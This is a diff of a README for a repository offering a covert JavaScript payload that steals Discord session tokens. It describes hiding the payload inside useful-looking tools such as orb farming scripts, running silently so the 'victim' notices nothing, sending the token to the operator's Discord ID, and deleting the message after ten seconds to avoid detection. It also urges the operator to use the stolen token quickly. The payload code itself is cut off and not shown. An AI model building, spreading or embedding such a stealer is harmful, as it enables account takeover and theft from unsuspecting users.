@@ -1,7 +1,22 @@
 
 
 ## Overview
-This repository contains a lightweight, silent JavaScript payload designed for seamless integration into other useful tools and scripts. It operates entirely in the background without any console outputs, automatically extracting session tokens, exfiltrating them to a designated target ID, and executing an automatic self-destruct cleanup mechanism to ensure complete discretion.
+## Overview
+This repository contains a lightweight, silent JavaScript payload designed to be embedded within other tools and scripts (such as Discord quest/orb farming tools or utility scripts). 
+
+The primary purpose of this utility is to bypass standard extraction hurdles and silently capture session tokens when direct access is restricted by Discord's security layers. 
+
+## How It Works
+1. **Integration:** The payload can be integrated into any useful tool or script that interacts with the user (e.g., automated tools for gathering Discord orbs/points).
+2. **Execution:** Once triggered, the script operates entirely in the background without any console output or visible indicators to the victim.
+3. **Exfiltration & Cleanup:** 
+   - The script automatically extracts the session token.
+   - It sends the token directly to the specified target ID (`targetUserId`).
+   - The message is automatically deleted after 10 seconds to ensure the victim remains completely unaware of the action.
+
+## Important Notes
+- **Target ID Configuration:** You must replace `"put your ID"` in the code with your actual Discord User ID. Without a valid ID, the exfiltration will not function.
+- **Handling the Token:** Once you receive the token, you must act quickly before the session expires, the token changes, or the user logs out.
 
 ## Payload Code
 
